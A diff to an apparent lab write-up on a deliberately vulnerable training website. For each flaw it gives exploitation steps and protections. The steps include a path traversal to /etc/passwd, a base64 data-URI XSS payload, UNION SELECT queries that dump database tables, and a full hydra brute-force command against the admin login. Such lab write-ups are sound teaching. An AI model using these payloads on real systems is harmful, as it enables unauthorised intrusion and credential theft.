@@ -50,24 +50,39 @@ In the footer of the main page, the website has redirection of social media. We 
 2. click on the link
 ** Protection
 It's possible to check the redirection with some arrays, so it would not be possible to redirect on anything other that we predefined.
-* idor_page
+* local_file_inclusion
+Local File Inclusion is an attack technique in which attackers trick a web application into either running or exposing files on a web server. On any page on the website, there is an attribute *page* in the url.
 ** Vulnerability
-Indirect object references is a vulnerability that arises when an application uses user-supplied input to access objects directly. In whatever page on the site there is an attribute *page* in the url, we can change this attribute to access to anything on the server.
 1. change http://192.168.56.105/index.php?page=sigin by
 http://192.168.56.105/index.php?page=../../../../../../../etc/passwd
 ** Protection
 Use an array of valid url, the attacker will have access only to these arrays.
-* idor_form
+* idor_src
+** Vulnerability
+Indirect object references is a vulnerability that arises when an application uses user-supplied input to access objects directly. An image is clickable on the main page and redirect us to http://192.168.56.105/?page=media&src=nsa . There is an object tag in the page that displays the content of the src in url. We can replace the src to make an XSS request.
+1. replace *src=nsa* by *src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=*
+** Protection
+Predefined the valid sources and don't use the input of the user.
+* form_check
 ** Vulnerability
 On the page http://192.168.56.105/index.php?page=survey there is a survey where we vote for people. By doing a vote, a POST request is made, we can change the values of this request.
 1. press F12
 2. vote for a person
 3. go to the 'network' tab
 4. edit the request and change the value by 42
-5. send a look at the response
+5. send and look at the response
 ** Proection
 Sanitize the input of the form in the backend and not only in the frontend !
-
+* cors
+** Vulnerability
+Click on the copyright in the bottom of the page. There is some comments in the source page which give us an hint. *"You must comming from : "https://www.nsa.gov/" to go to the next step* and *the browser ft_borntosec will help you*.
+We need to change the referrer and the user agent in request.
+1. press F12
+2. reload the page
+3. edit the request, change the referrer by *"https://www.nsa.gov/"* and the user-agent by *"ft_borntosec"*
+4. send and look at the response
+** Protection
+The referrer and the user-agent are not enough to check the validity of a request. The Cross Origin Request must be enabled and configured.
 * insecure_upload
 ** Vulnerability
 It's possible to upload an image on the page http://192.168.56.105/?page=upload . The website only check the header of the request for the uploaded file.
@@ -77,7 +92,12 @@ It's possible to upload an image on the page http://192.168.56.105/?page=upload 
 4. send and look at the response
 ** Protection
 Looking at the header is not enough.
-* sql_injection
+* xss_stored
+** Vulnerability
+On the page http://192.168.56.103/index.php?page=feedback  it's possible for the users to leave feedbacks. Any comments leads to XSS and gives the flag. This is exagerated but real XSS attacks can lead to serious threats on websites, it can steal cookies, make request for any users who visite the page ...
+** Protection
+SANTIZE THE INPUT ! Use appropriate response headers. To prevent XSS in HTTP responses that aren't intended to contain any HTML or JavaScript, you can use the Content-Type and X-Content-Type-Options headers to ensure that browsers interpret the responses in the way you intend.
+* sql_injection_member
 ** Vulnerability
 On the page http://192.168.56.105/index.php?page=member we can search users by their 'id'. If we enter a letter for example, an error is displayed which reveals that it reads sql commands.
 
@@ -92,3 +112,22 @@ On the page http://192.168.56.105/index.php?page=member we can search users by t
 ** Protection
 Sanitize the input of form and use parametrized queries.
 Parameterized queries are a means of pre-compiling an SQL statement so that you can then supply the parameters in order for the statement to be executed. This method makes it possible for the database to recognize the code and distinguish it from input data.
+* sql_injection_image
+** Vulnerability
+Same as *sql_injection_member* but on the page http://192.168.56.105/?page=searchimg.
+
+1. 5 UNION SELECT table_schema,table_name FROM information_schema.columns
+2. 5 UNION SELECT table_name,column_name FROM information_schema.columns
+3. 5 UNION SELECT title,comment FROM list_images
+4. ~echo -n 'albatroz' | sha2~
+** Protection
+Sanitize the input of form and use parametrized queries.
+Parameterized queries are a means of pre-compiling an SQL statement so that you can then supply the parameters in order for the statement to be executed. This method makes it possible for the database to recognize the code and distinguish it from input data.
+* bruteforce_login_page
+** Vulnerability
+There is a login page, http://192.168.56.103/index.php?page=signin. We does not know any creds so we can bruteforce it.
+
+1. ~hydra -l admin -P /usr/share/SecLists/Passwords/Common-Credentials/top-passwords-shortlist.txt '192.168.56.103' http-get-form '/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif' -I -F~ We try each password in the file.txt for the username admin until the response does not containt 'WrongAnswer.gif'.
+ 2. log-in as admin:shadow
+** Protection
+Use strict policy for passwords ! Also, block the ip address who make too many requests.
